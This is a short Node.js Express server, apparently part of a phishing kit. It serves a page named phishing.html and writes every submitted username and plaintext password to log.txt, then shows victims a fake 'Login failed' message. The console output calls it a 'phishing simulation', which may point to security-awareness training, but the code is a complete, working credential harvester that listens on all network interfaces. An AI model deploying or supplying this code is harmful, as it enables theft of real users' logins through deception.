import express from "express";
import fs from "fs";
import path from "path";
import bodyParser from "body-parser";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3007;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "phishing.html"));
});

app.post("/capture", (req, res) => {
  const { username, password } = req.body;
  const logEntry = `[${new Date().toISOString()}] USER: ${username}  PASS: ${password}\n`;
  fs.appendFileSync("log.txt", logEntry);

  res.send("<h2>Login failed. Please try again later.</h2>");
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Phishing simulation running at http://localhost:${PORT}`);
});